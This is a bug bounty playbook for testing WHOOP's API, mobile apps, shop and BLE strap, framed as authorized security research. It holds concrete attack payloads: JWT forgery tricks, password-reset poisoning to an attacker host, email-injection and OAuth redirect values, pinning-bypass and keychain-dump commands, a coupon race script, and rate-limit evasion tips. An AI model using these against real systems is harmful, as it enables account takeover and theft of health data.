# WHOOP Bug Bounty — Elite Attack Playbook
## Thinking Like a Top Hacker | Derived from 3,000+ Paid Reports

> **Target**: WHOOP (whoop.com) — Wearable health/fitness platform
> **Sensitive Data**: Sleep, HRV, strain, recovery, heart rate, SpO2, skin temp
> **Authorization**: For authorized testing on HackerOne program only

---

## PHASE 1: Passive Reconnaissance & Attack Surface Mapping

### 1.1 Why Top Hackers Start Here

The #1 differentiator between a $500 bug and a $15,000 bug is **understanding the target deeply before testing**. Top hackers spend 60-70% of their time on recon. They don't fuzz randomly — they find the ONE endpoint nobody else looked at.

---

### 1.2 Subdomain & Infrastructure Discovery

```bash
# Step 1: Enumerate all WHOOP subdomains (passive, non-intrusive)
subfinder -d whoop.com -silent -o whoop-subs.txt
amass enum -passive -d whoop.com -o whoop-amass.txt

# Step 2: Certificate Transparency Logs
curl -s "https://crt.sh/?q=%.whoop.com&output=json" | \
  jq -r '.[].name_value' | sort -u > whoop-ct.txt

# Step 3: Merge and deduplicate
cat whoop-subs.txt whoop-amass.txt whoop-ct.txt | \
  sort -u > whoop-all-subs.txt

# Step 4: Resolve and probe (identify live hosts)
cat whoop-all-subs.txt | httpx -silent -status-code -tech-detect -title | \
  tee whoop-alive.txt

# Step 5: Screenshot all live targets
cat whoop-alive.txt | awk '{print $1}' | gowitness file -f -
```

**What you're looking for:**
- Staging/dev environments (dev.whoop.com, staging-api.whoop.com)
- Admin panels (admin.whoop.com, internal.whoop.com)
- API documentation (docs.whoop.com, swagger.whoop.com)
- Forgotten/legacy services
- Cloud infrastructure (S3, CloudFront, Azure, GCP indicators)

---

### 1.3 Technology Stack Fingerprinting

```bash
# Identify tech stack from headers, responses, JS files
httpx -u https://api.prod.whoop.com -tech-detect -status-code -title
httpx -u https://app.whoop.com -tech-detect -status-code -title
httpx -u https://shop.whoop.com -tech-detect -status-code -title

# Check for API documentation exposure
curl -s https://api.prod.whoop.com/swagger.json
curl -s https://api.prod.whoop.com/openapi.json
curl -s https://api.prod.whoop.com/v1/docs
curl -s https://api.prod.whoop.com/graphql?query={__schema{types{name}}}

# Check JavaScript bundles for API routes
curl -s https://app.whoop.com | grep -oP 'src="[^"]*\.js"' | \
  while read js; do
    curl -s "https://app.whoop.com$js" | grep -oiE '/api/v[0-9]+/[a-z_/]+' 
  done

# Check for source maps (GOLD MINE if exposed)
curl -s https://app.whoop.com/main.js.map
```

**Key intel to gather:**
| Question | Why It Matters |
|----------|---------------|
| What API framework? (Express, Django, Rails, Go) | Determines common vuln patterns |
| Authentication method? (JWT, OAuth2, Session, API Key) | Determines ATO attack surface |
| GraphQL or REST? | GraphQL = introspection, batching, nested queries |
| Cloud provider? (AWS, GCP, Azure) | Determines SSRF metadata targets |
| CDN? (CloudFront, Cloudflare, Akamai) | Determines WAF bypass needs |
| Payment processor? (Stripe) | Logic bugs in payment flow |

---

### 1.4 API Endpoint Discovery (The Top Hacker Way)

```bash
# 1. Historical URLs from web archives (passive, no contact with target)
echo "whoop.com" | gau --threads 5 | grep -iE "api|/v[0-9]" | sort -u > whoop-api-urls.txt
echo "whoop.com" | waybackurls | grep -iE "api|/v[0-9]" | sort -u >> whoop-api-urls.txt

# 2. Extract API routes from mobile app (decompile APK)
# Download APK from play store mirror
# apktool d com.whoop.android.apk -o whoop-apk
# grep -rhoP 'https?://[a-zA-Z0-9._/\-]+' whoop-apk/ | sort -u

# 3. Extract from iOS app (if jailbroken)
# Dump binary, run strings, look for URL patterns

# 4. Proxy the mobile app traffic (most valuable recon technique)
# Setup Burp/mitmproxy with WHOOP mobile app
# Map every single API call during:
#   - Registration
#   - Login / OAuth flow
#   - Profile viewing/editing
#   - Viewing health data (sleep, strain, recovery)
#   - Social features (teams, groups)
#   - Shop / purchase flow
#   - Settings changes
#   - Notification interactions
```

---

### 1.5 What Top Hackers Map (The Mental Model)

```
WHOOP Ecosystem Map:
├── Identity & Auth Layer
│   ├── Registration (join.whoop.com)
│   ├── OAuth/SSO (okta.whoop.com - OUT OF SCOPE for Okta bugs)
│   ├── Password Reset
│   ├── Session Management (JWT? cookies?)
│   └── MFA/2FA
│
├── Core API (api.prod.whoop.com) ← PRIMARY TARGET
│   ├── User Profile CRUD
│   ├── Health Data (sleep, recovery, strain, HRV)
│   ├── Workout/Activity logging
│   ├── Social/Teams/Groups
│   ├── Coaching features
│   ├── Device pairing/management
│   ├── Notification preferences
│   └── Data export/sharing
│
├── Web App (app.whoop.com)
│   ├── Dashboard views
│   ├── Settings/preferences
│   ├── Team management
│   └── Data visualization
│
├── E-commerce (shop.whoop.com)
│   ├── Product catalog
│   ├── Cart/checkout (Stripe)
│   ├── Discount/coupon logic
│   ├── Order management
│   ├── Subscription management
│   └── Shipping/address
│
├── Mobile Apps
│   ├── iOS (com.whoop.iphone)
│   ├── Android (com.whoop.android)
│   ├── BLE communication with strap
│   ├── Local data storage
│   ├── Deep links / URL schemes
│   └── WebViews
│
└── Hardware (WHOOP 4.0/5.0 Strap)
    ├── BLE protocol
    ├── Firmware updates
    ├── Sensor data transmission
    └── Pairing/authentication
```

---

### 1.6 Intelligence Gathering (OSINT for Prioritization)

```bash
# Check what other hackers already found (public disclosures)
# Look at the 34% acceptance rate on api.prod.whoop.com

# Check LinkedIn for WHOOP engineering team
# → What languages/frameworks they use
# → Recent job postings reveal tech stack

# Check GitHub for WHOOP open source or employee repos
# → Accidental commits, internal API docs, env files
# NOTE: Per scope rules, leaked customer creds won't be accepted
#       BUT leaked WHOOP employee creds WILL be accepted

# Search for WHOOP in bug bounty writeups
# → What categories have been found before
# → What's been marked as duplicate (avoid wasting time)
```

---

### 1.7 Phase 1 Deliverables (Before You Touch Anything)

Before sending a single request to WHOOP, you should have:

- [ ] Complete subdomain list with live hosts
- [ ] Technology stack identified for each target
- [ ] API endpoint map (from JS files, mobile app, archives)
- [ ] Authentication flow understood (OAuth, JWT structure, session handling)
- [ ] High-value data model understood (what data exists, how it's accessed)
- [ ] Priority target list ranked by opportunity (low reports = less duplicate risk)

---

### 1.8 Top Hacker Mindset — Target Prioritization

| Target | Why Attack It First |
|--------|-------------------|
| **api.prod.whoop.com** | Highest acceptance (34%), health data = high impact, IDOR/auth bypass potential |
| **Mobile Apps (iOS/Android)** | ZERO iOS reports, 1 Android — nobody's looking here seriously |
| **WHOOP 5.0/4.0 Strap (BLE)** | ZERO reports — completely untested, hardware vulns = unique findings |
| **shop.whoop.com** | Payment/order logic bugs, 10% acceptance |
| **join.whoop.com** | Registration flow bugs, rate limiting, invite abuse |

**The Golden Rule**: Go where others aren't. Mobile apps and hardware have virtually zero submissions.

---


## PHASE 2: API Authorization Testing (api.prod.whoop.com)

### 2.1 Why This Is The #1 Target

api.prod.whoop.com has **34% of all accepted reports** — meaning the API has real vulnerabilities being found consistently. WHOOP explicitly states: *"Successful submissions must demonstrate unauthorized access to data beyond the credential's expected access."*

Translation: **They're telling you IDOR and broken authorization are the bugs they pay for.**

---

### 2.2 The BOLA/IDOR Hunting Framework

**Step 1: Map every object reference in the API**

Set up Burp proxy with your WHOOP account and interact with EVERY feature:

```
Expected API patterns (hypothetical, discover via proxy):
GET  /api/v1/users/{user_id}/profile
GET  /api/v1/users/{user_id}/cycles
GET  /api/v1/users/{user_id}/sleep
GET  /api/v1/users/{user_id}/recovery
GET  /api/v1/users/{user_id}/workouts
GET  /api/v1/users/{user_id}/heart-rate
GET  /api/v1/teams/{team_id}/members
GET  /api/v1/groups/{group_id}
POST /api/v1/users/{user_id}/settings
GET  /api/v1/orders/{order_id}
GET  /api/v1/devices/{device_id}
```

**Step 2: Two-Account Testing (CRITICAL TECHNIQUE)**

```
Account A: Your primary test account (victim)
Account B: Your secondary test account (attacker)

Test Pattern:
1. Login as Account A
2. Access /api/v1/users/A_ID/sleep → 200 OK (normal)
3. Login as Account B  
4. Access /api/v1/users/A_ID/sleep → If 200 OK = CRITICAL IDOR

Do this for EVERY endpoint that has an object ID.
```

**Step 3: ID Manipulation Techniques**

```
# Sequential integer IDs
/api/v1/users/12345/sleep → your data
/api/v1/users/12344/sleep → previous user's health data?

# UUID manipulation (if UUIDs are v1/time-based)
# Extract timestamp from your UUID, predict others

# Parameter pollution
/api/v1/sleep?user_id=YOUR_ID → normal
/api/v1/sleep?user_id=VICTIM_ID → unauthorized access?

# HTTP method switching
GET /api/v1/users/VICTIM/profile → 403
PUT /api/v1/users/VICTIM/profile → 200? (write IDOR)

# Version downgrade
/api/v2/users/VICTIM/data → 403 (has authz check)
/api/v1/users/VICTIM/data → 200? (legacy, no authz)
```

---

### 2.3 Broken Function-Level Authorization (BFLA)

```
# Standard user trying admin endpoints
GET  /api/v1/admin/users          → Can regular user list all users?
POST /api/v1/admin/export         → Can regular user export all data?
GET  /api/v1/internal/metrics     → Internal endpoints exposed?
POST /api/v1/users/VICTIM/coach   → Can you assign yourself as coach?
DELETE /api/v1/users/VICTIM/data  → Can you delete others' data?

# Role escalation
POST /api/v1/users/YOUR_ID/role
Body: {"role": "admin"}           → Does it accept role changes?

# Team/Group privilege escalation
POST /api/v1/teams/TEAM_ID/admin
Body: {"user_id": "YOUR_ID"}      → Can you make yourself team admin?
```

---

### 2.4 Health Data Specific Attacks (WHOOP's Crown Jewels)

WHOOP's most sensitive data is health metrics. Accessing another user's health data = **Critical severity**.

```
# Sleep data exposure
GET /api/v1/users/{VICTIM_ID}/sleep/cycles
GET /api/v1/users/{VICTIM_ID}/sleep/{date_range}

# Recovery/HRV data
GET /api/v1/users/{VICTIM_ID}/recovery
GET /api/v1/users/{VICTIM_ID}/hrv

# Heart rate data (real-time or historical)
GET /api/v1/users/{VICTIM_ID}/heart-rate
GET /api/v1/users/{VICTIM_ID}/heart-rate/live

# Workout/Strain data
GET /api/v1/users/{VICTIM_ID}/workouts
GET /api/v1/users/{VICTIM_ID}/strain

# Body metrics
GET /api/v1/users/{VICTIM_ID}/body-metrics

# Export features (bulk data download)
POST /api/v1/users/{VICTIM_ID}/export
GET  /api/v1/users/{VICTIM_ID}/export/download
```

**Impact Statement Template:**
> "An attacker can access any WHOOP user's [sleep/HRV/heart rate] data by manipulating the user_id parameter. This exposes Protected Health Information (PHI) of all WHOOP members, violating user privacy and potentially HIPAA requirements."

---

### 2.5 GraphQL Specific Attacks (If WHOOP Uses GraphQL)

```graphql
# Introspection (discover entire schema)
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Batching attack (bypass rate limits)
[
  {"query": "{ user(id: 1) { email healthData { hrv } } }"},
  {"query": "{ user(id: 2) { email healthData { hrv } } }"},
  {"query": "{ user(id: 3) { email healthData { hrv } } }"}
]

# Nested query depth attack
{
  user(id: VICTIM) {
    teams {
      members {
        healthData {
          sleep { cycles { hrv } }
        }
      }
    }
  }
}

# Field suggestion exploitation
{ user(id: VICTIM) { __typename } }
# Then fuzz field names based on suggestions
```

---

### 2.6 API Rate Limiting & Mass Data Extraction

```
# Test if you can enumerate users
for i in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer TOKEN" \
    "https://api.prod.whoop.com/api/v1/users/$i/profile" \
    -o /dev/null -w "%{http_code}\n"
  sleep 1  # Be respectful, don't DoS
done

# If 200s come back for other users = CRITICAL IDOR
# If rate limited = test bypass techniques:
# - Rotate IP via proxy
# - Use different auth tokens
# - Add X-Forwarded-For header variations
# - Chunk requests over time
```

---

### 2.7 API Misconfiguration Checks

| Check | What to Test |
|-------|-------------|
| CORS | `Origin: https://evil.com` — does it reflect? Can you steal data cross-origin? |
| Verbose errors | Send malformed requests — do errors reveal internal structure? |
| HTTP methods | Try OPTIONS, TRACE, PUT, DELETE on all endpoints |
| Content-Type confusion | Send XML where JSON expected — XXE possible? |
| Mass assignment | Add extra fields in POST/PUT (role, admin, premium, verified) |
| No auth endpoints | Which endpoints work without Authorization header? |
| Expired/revoked tokens | Do old tokens still work after password change? |
| Token scope | Can a read-only token perform write operations? |

---


## PHASE 3: Authentication & Account Takeover

### 3.1 The ATO Mindset

WHOOP accounts contain **extremely sensitive health data**. An account takeover means accessing someone's entire physiological history — sleep patterns, heart rate, recovery scores. This is Critical severity every time.

---

### 3.2 Authentication Flow Analysis

```
# Map the complete auth flow by proxying:
# 1. Registration (join.whoop.com)
# 2. Login (what OAuth provider? Okta? Direct?)
# 3. Password reset
# 4. Session token issuance
# 5. Token refresh mechanism
# 6. Logout / session invalidation

# Key questions to answer:
# - Is auth JWT-based? What's in the payload?
# - Are tokens stored in localStorage (XSS-stealable)?
# - Is there a refresh token? How long does it live?
# - Does password reset invalidate existing sessions?
# - Is there MFA? Can it be bypassed?
```

---

### 3.3 JWT Attack Vectors

```bash
# Decode the JWT (don't need the secret for this)
echo "eyJ..." | base64 -d

# Check JWT contents:
# - "sub" field = user identifier (can you change it?)
# - "role" field = privilege level (can you escalate?)
# - "exp" field = expiration (is it far future?)
# - "aud" field = audience (cross-service token reuse?)

# Algorithm Confusion Attack
# If server accepts both HS256 and RS256:
# 1. Get the public key (often in /jwks or /.well-known/)
# 2. Sign a forged token using the public key as HMAC secret
# 3. Change "alg" header from RS256 to HS256

# None Algorithm Attack
# Change header to: {"alg": "none", "typ": "JWT"}
# Remove signature, keep the trailing dot
# eyJ...header.eyJ...payload.

# Key ID (kid) Injection
# If JWT has "kid" in header:
{"kid": "../../../dev/null", "alg": "HS256"}
# Signs with empty key

# Token Not Expiring
# Change exp to a date far in the future
# Check if server validates expiration server-side
```

---

### 3.4 Password Reset Attacks

```
# Host Header Injection (password reset poisoning)
POST /api/v1/auth/forgot-password
Host: attacker.com
Body: {"email": "victim@email.com"}
# If reset link uses Host header = token sent to attacker domain

# Token Predictability
# Request multiple reset tokens, analyze patterns
# Are they sequential? Time-based? Short enough to brute force?

# Token Reuse
# Use a reset token → does it get invalidated?
# Can you use the same token twice?

# Rate Limiting Bypass on Reset
# Can you request unlimited reset tokens?
# IP rotation, header manipulation to bypass rate limits

# Email Parameter Manipulation
POST /api/v1/auth/forgot-password
Body: {"email": "victim@email.com", "email": "attacker@email.com"}
# Parameter pollution — does it send to second email?

Body: {"email": ["victim@email.com", "attacker@email.com"]}
# Array injection

Body: {"email": "victim@email.com%00attacker@email.com"}
# Null byte injection

Body: {"email": "victim@email.com\ncc:attacker@email.com"}
# SMTP header injection
```

---

### 3.5 OAuth/SSO Attack Surface

```
# Since WHOOP uses Okta (okta.whoop.com):
# Test the OAuth flow between WHOOP app and Okta

# 1. Redirect URI manipulation
# After Okta auth, where does the token go?
redirect_uri=https://app.whoop.com/callback → normal
redirect_uri=https://app.whoop.com.attacker.com → subdomain trick?
redirect_uri=https://app.whoop.com/callback/../../../attacker → path traversal?
redirect_uri=https://app.whoop.com/callback?next=http://evil.com → open redirect chain?

# 2. State Parameter
# Is state parameter present? Is it validated?
# Remove state → CSRF possible on OAuth flow?
# Reuse state across sessions?

# 3. Token Leakage
# Does the access token appear in:
# - URL fragment (#access_token=...)
# - Referrer header (leaked to third parties)
# - Browser history
# - JavaScript accessible location

# 4. Scope Escalation
# Request more OAuth scopes than normally granted
scope=read_profile+read_health+admin_access
```

---

### 3.6 Session Management Attacks

```
# Session Fixation
# Can you set a session token before authentication?
# Then victim authenticates into YOUR session?

# Session Not Invalidated After:
# - Password change (CRITICAL — old sessions should die)
# - Email change
# - MFA enable/disable
# - Account deactivation

# Concurrent Session Abuse
# Login on multiple devices
# Does changing password kill all sessions?

# Token in URL
# If token passes via URL parameters → Referrer leakage
```

---

### 3.7 MFA Bypass Techniques

```
# 1. Response Manipulation
# Intercept MFA verification response
# Change {"success": false} to {"success": true}
# Change HTTP 403 to 200

# 2. Direct Endpoint Access
# After password auth, skip MFA step
# Go directly to /api/v1/dashboard or authenticated endpoint
# Does the API check MFA completion?

# 3. Backup Code Brute Force
# Are backup codes short enough to brute force?
# Rate limiting on backup code attempts?

# 4. MFA Disable Without MFA
# Can you disable MFA from settings without re-verifying?
# PUT /api/v1/users/ME/settings {"mfa_enabled": false}

# 5. Race Condition
# Send multiple MFA verification requests simultaneously
# Can you bypass attempt limits?
```

---


## PHASE 4: Mobile App Attack Vectors (iOS/Android)

### 4.1 Why Mobile is the Hidden Goldmine

**iOS: 0 reports. Android: 1 report (2%).** Nobody is seriously testing the mobile apps. This is where top hackers find unique bugs because:
- Mobile apps often have weaker security than web
- BLE communication can expose device protocols
- Local data storage often contains sensitive health data in cleartext
- Deep links and URL schemes create unexpected attack surface

---

### 4.2 Android Testing Methodology

```bash
# Step 1: Obtain and decompile APK
# Download from APKMirror or use ADB pull
apktool d com.whoop.android.apk -o whoop-decompiled/
jadx com.whoop.android.apk -d whoop-jadx/

# Step 2: Extract hardcoded secrets
grep -rn "api_key\|secret\|password\|token\|AUTH" whoop-jadx/
grep -rn "https://\|http://" whoop-jadx/ | sort -u
grep -rn "firebase\|aws\|azure\|gcp" whoop-jadx/

# Step 3: Check for insecure data storage
# On rooted device after using the app:
adb shell
ls /data/data/com.whoop.android/shared_prefs/
cat /data/data/com.whoop.android/shared_prefs/*.xml
ls /data/data/com.whoop.android/databases/
sqlite3 /data/data/com.whoop.android/databases/whoop.db ".dump"
# Look for: auth tokens, health data, PII in cleartext

# Step 4: Certificate Pinning Bypass (to intercept traffic)
# Use Frida + objection
objection -g com.whoop.android explore
android sslpinning disable

# Or use Frida script:
frida -U -f com.whoop.android -l ssl-bypass.js

# Step 5: Deep Link / Intent Analysis
# From AndroidManifest.xml:
grep -A5 "intent-filter" whoop-decompiled/AndroidManifest.xml
# Look for exported activities, custom URL schemes
# whoop:// or https://app.whoop.com/deep-link/...

# Test deep link injection:
adb shell am start -a android.intent.action.VIEW \
  -d "whoop://profile?user_id=VICTIM_ID" com.whoop.android
```

---

### 4.3 iOS Testing Methodology

```bash
# Step 1: Obtain IPA (jailbroken device or use tools)
# Decrypt binary with frida-ios-dump or clutch

# Step 2: Static Analysis
# Extract strings and URLs
strings WHOOP.app/WHOOP | grep -i "api\|http\|secret\|key"

# Check Info.plist for URL schemes
plutil -p WHOOP.app/Info.plist | grep -A5 "CFBundleURLSchemes"

# Step 3: Runtime Analysis with Frida
frida -U -n "WHOOP" -l dump-keychain.js
# Dump keychain items — auth tokens, certificates

# Step 4: Check for insecure local storage
# NSUserDefaults, CoreData, Realm, SQLite
find /var/mobile/Containers/Data/Application/WHOOP-UUID/ -name "*.db" -o -name "*.sqlite" -o -name "*.plist"

# Step 5: Deep Link Testing
# Universal Links (apple-app-site-association)
curl -s https://app.whoop.com/.well-known/apple-app-site-association

# Test URL scheme hijacking
# If another app can register same scheme = token theft
```

---

### 4.4 Mobile-Specific High-Impact Bugs

| Bug Type | How to Find | Impact |
|----------|-------------|--------|
| Auth token in cleartext storage | Check SharedPrefs/NSUserDefaults | ATO via physical access or backup extraction |
| Deep link IDOR | `whoop://user/{id}` with other user's ID | Access other's profile/data |
| WebView XSS | Find WebViews loading user-controlled URLs | Steal tokens, execute JS in app context |
| Exported Activities/Services | Check AndroidManifest for exported=true | Unauthorized feature access |
| Insecure BLE pairing | Sniff BLE during pairing | Intercept health data in transit |
| Certificate pinning bypass → hidden APIs | Bypass pinning, find undocumented endpoints | Access internal/debug APIs |
| Clipboard data leakage | Copy sensitive data, check clipboard | Health data exposed to other apps |
| Screenshot/recording not blocked | Sensitive screens allow screenshots | Health data in screenshots |
| Backup includes sensitive data | `android:allowBackup="true"` | Extract data from device backup |

---

### 4.5 BLE (Bluetooth Low Energy) — WHOOP Strap Communication

```bash
# Step 1: BLE Sniffing Setup
# Use: nRF Connect, Wireshark + Ubertooth, or btlejack

# Step 2: Identify WHOOP BLE characteristics
# During app-strap communication:
# - What data is transmitted? (raw health data? commands?)
# - Is the channel encrypted?
# - Is pairing authenticated?

# Step 3: Replay Attacks
# Capture BLE packets during legitimate session
# Replay them — does the strap accept them?
# Can you pair with someone else's strap?

# Step 4: Man-in-the-Middle
# Position between phone and strap
# Intercept and modify health data in transit
# Inject fake sensor readings

# Key questions:
# - Can an attacker pair with your strap if nearby? 
# - Can they read your health data via BLE without the app?
# - Can they inject false data into your strap?
# - Is firmware update verified/signed?
```

---


## PHASE 5: E-commerce & Payment Logic (shop.whoop.com)

### 5.1 Payment Logic — Where Money Bugs Live

WHOOP sells hardware (straps, bands) and likely has subscriptions. Per scope rules: card testing is forbidden, but **logic bugs in the purchase flow are fair game**.

---

### 5.2 Price Manipulation Attacks

```
# Intercept checkout request and modify:
POST /api/checkout/create-order
{
  "items": [{"sku": "whoop-5.0", "quantity": 1, "price": 0.01}],
  "discount": "100_PERCENT_OFF",
  "shipping": "free"
}

# Negative quantity trick
{"quantity": -1, "sku": "whoop-strap"}
# Does it create a refund/credit?

# Currency confusion
{"price": 299, "currency": "IDR"}  # instead of USD

# Integer overflow
{"quantity": 2147483647}  # max int
{"price": 0}  # zero price

# Coupon/discount stacking
Apply same coupon multiple times
Apply expired coupon codes
Use coupon meant for different product
Modify discount percentage in request
```

---

### 5.3 Race Condition Attacks

```python
# Race condition on coupon redemption
# (Use a single-use coupon multiple times simultaneously)
import asyncio
import aiohttp

async def redeem_coupon(session, token):
    async with session.post(
        'https://shop.whoop.com/api/cart/apply-coupon',
        json={"code": "SINGLE_USE_50OFF"},
        headers={"Authorization": f"Bearer {token}"}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [redeem_coupon(session, TOKEN) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        # Check if coupon applied multiple times
        
asyncio.run(main())
```

```
# Race conditions to test:
# - Apply same coupon code simultaneously (TOCTOU)
# - Place same item in cart from multiple sessions
# - Redeem gift card while spending it simultaneously
# - Cancel + fulfill order at same time
# - Claim referral bonus multiple times
```

---

### 5.4 Order IDOR

```
# If orders have sequential/predictable IDs:
GET /api/v1/orders/10001  → your order
GET /api/v1/orders/10000  → other user's order?
GET /api/v1/orders/10002  → future order?

# Can you:
# - View other users' order details (address, items, payment)?
# - Modify someone else's shipping address?
# - Cancel someone else's order?
# - Re-download someone else's invoice?
```

---

### 5.5 Subscription Manipulation

```
# WHOOP likely has subscription management:
PUT /api/v1/subscriptions/{sub_id}
{"plan": "premium", "price": 0}

# Trial abuse
# - Create multiple trials with same device/card
# - Extend trial by manipulating date parameters
# - Access premium features without active subscription

# Downgrade → retain access
# - Downgrade plan but still access premium API endpoints
# - Cancel subscription but session still has premium privileges
```

---

### 5.6 Key Rule Reminder

> *"Any claim of ordering free or heavily discounted WHOOP merchandise will be marked as spam without evidence of the order actually arriving to you and a valid orderId."*

**This means**: You need to actually receive the product AND have a valid orderId. Don't just screenshot a cart manipulation — it needs to result in a real fulfilled order. Be careful here.

---


## PHASE 6: Hardware/BLE Attack Vectors (WHOOP Strap)

### 6.1 Why Hardware Has ZERO Reports

Nobody has submitted hardware findings yet because:
- It requires physical hardware ($299+ investment)
- BLE testing requires specialized tools
- Firmware analysis is time-consuming
- Most web hackers don't know hardware security

**This means**: Any valid hardware finding will likely be unique (no duplicates) and high-severity.

---

### 6.2 BLE Attack Surface

```
# Required Tools:
# - Ubertooth One (BLE sniffing)
# - nRF52840 Dongle (BLE interaction)
# - Wireshark + BLE plugins
# - nRF Connect mobile app
# - GATTacker (BLE MitM)
# - btlejack (BLE sniffing/injection)

# Step 1: Identify WHOOP BLE services
# Use nRF Connect to scan for WHOOP strap
# Document all:
# - Service UUIDs
# - Characteristic UUIDs
# - Read/Write/Notify properties
# - Descriptors

# Step 2: Analyze pairing security
# - Does it use Just Works (no authentication)?
# - Does it use Passkey Entry?
# - Does it use Numeric Comparison?
# - Is pairing data stored securely?

# Step 3: Data in transit analysis
# Capture BLE traffic during:
# - Initial pairing
# - Health data sync
# - Firmware update
# - Device configuration change
# Questions:
# - Is data encrypted at the application layer?
# - Can you decode health metrics from raw BLE data?
# - Are commands authenticated?
```

---

### 6.3 Firmware Analysis

```bash
# If firmware update can be captured:
# 1. Intercept OTA update (over BLE or via app download)
# 2. Extract firmware binary
# 3. Analyze with binwalk, ghidra, IDA Pro

binwalk firmware.bin
# Look for embedded keys, certificates, hardcoded credentials

# Firmware signing verification
# Is the firmware signed? Can you push a modified firmware?
# Unsigned firmware = remote code execution on the strap
```

---

### 6.4 Potential High-Impact Hardware Bugs

| Vulnerability | Impact | Severity |
|--------------|--------|----------|
| Unauthenticated BLE pairing | Anyone nearby can pair with your strap | High |
| Unencrypted health data over BLE | Passive eavesdropping on heart rate, HRV | Critical |
| BLE command injection | Attacker sends commands to your strap | High |
| Firmware not signed | Push malicious firmware update | Critical |
| Device identity spoofing | Clone a strap, impersonate user | High |
| Replay attacks on sync data | Inject false health data into account | Medium |
| Factory reset bypass | Access previous owner's pairing info | Medium |

---

## PHASE 7: Execution Priority Matrix

### 7.1 The Top Hacker's Attack Order

Based on probability of success × impact × uniqueness:

```
PRIORITY 1 (Start here — highest ROI):
┌─────────────────────────────────────────────────────────────────┐
│ API IDOR on health data endpoints (api.prod.whoop.com)          │
│ → Two accounts, swap IDs, access other user's sleep/HRV/HR     │
│ → This is EXACTLY what WHOOP says they pay for                  │
│ Expected severity: CRITICAL                                      │
│ Expected bounty: $$$$$                                           │
└─────────────────────────────────────────────────────────────────┘

PRIORITY 2 (Unique findings, no competition):
┌─────────────────────────────────────────────────────────────────┐
│ Mobile App vulnerabilities (insecure storage, deep links)        │
│ → 0-1 reports ever submitted = almost zero duplicate risk        │
│ → Health data in SharedPrefs/NSUserDefaults = Critical           │
│ Expected severity: HIGH-CRITICAL                                 │
│ Expected bounty: $$$$                                            │
└─────────────────────────────────────────────────────────────────┘

PRIORITY 3 (High impact, proven attack surface):
┌─────────────────────────────────────────────────────────────────┐
│ Authentication bypass / Account Takeover                         │
│ → JWT manipulation, password reset poisoning, OAuth flaws        │
│ → Health data ATO = immediate Critical                           │
│ Expected severity: CRITICAL                                      │
│ Expected bounty: $$$$                                            │
└─────────────────────────────────────────────────────────────────┘

PRIORITY 4 (Logic bugs):
┌─────────────────────────────────────────────────────────────────┐
│ E-commerce logic (shop.whoop.com)                                │
│ → Price manipulation, subscription bypass, order IDOR            │
│ → Needs actual fulfilled order for merchandise claims            │
│ Expected severity: HIGH                                          │
│ Expected bounty: $$$                                             │
└─────────────────────────────────────────────────────────────────┘

PRIORITY 5 (Specialized, high barrier):
┌─────────────────────────────────────────────────────────────────┐
│ Hardware/BLE attacks (WHOOP 4.0/5.0 Strap)                      │
│ → Zero reports = guaranteed unique                               │
│ → Requires hardware investment + BLE tools                       │
│ → Any valid finding = instant accept (no duplicates possible)    │
│ Expected severity: HIGH-CRITICAL                                 │
│ Expected bounty: $$$$                                            │
└─────────────────────────────────────────────────────────────────┘
```

---

### 7.2 The 80/20 Rule for WHOOP

If you can only spend limited time, focus **80% of effort** on:

1. **Proxy the mobile app** → Map every API endpoint
2. **Two-account IDOR testing** → Swap user IDs on every health data endpoint
3. **JWT/Auth analysis** → Look for token manipulation, session flaws
4. **Check API versioning** → Old API versions may lack authorization

These 4 activities have the highest probability of finding Critical bugs based on the 34% acceptance rate on the API target.

---

### 7.3 Report Quality Template

```markdown
## Title
[Vulnerability Type] in [Endpoint] allows [Impact] of WHOOP member data

## Summary
A [IDOR/auth bypass/etc.] vulnerability in `api.prod.whoop.com` allows 
an authenticated attacker to access [sleep/HRV/heart rate] data of any 
WHOOP member by [technique].

## Steps to Reproduce
1. Create two WHOOP accounts (Account A and Account B)
2. Login as Account A, note user_id: `XXXXX`
3. Login as Account B, capture Authorization token
4. Send request: `GET /api/v1/users/XXXXX/sleep` with Account B's token
5. Observe: Account A's sleep data returned

## Impact
An attacker can access Protected Health Information (PHI) of any WHOOP 
member including [sleep cycles, HRV, heart rate, recovery scores]. 
This affects all ~X million WHOOP members and exposes their most 
sensitive biometric data without authorization.

## Severity
CRITICAL — Unauthorized access to health data of any user, no user 
interaction required, affects confidentiality of all members.

## Remediation
Implement proper object-level authorization checks verifying the 
authenticated user has permission to access the requested user_id's data.
```

---

*This playbook is for authorized security testing on the WHOOP HackerOne bug bounty program only. Always comply with program rules, test only on accounts you own, and never perform destructive actions.*
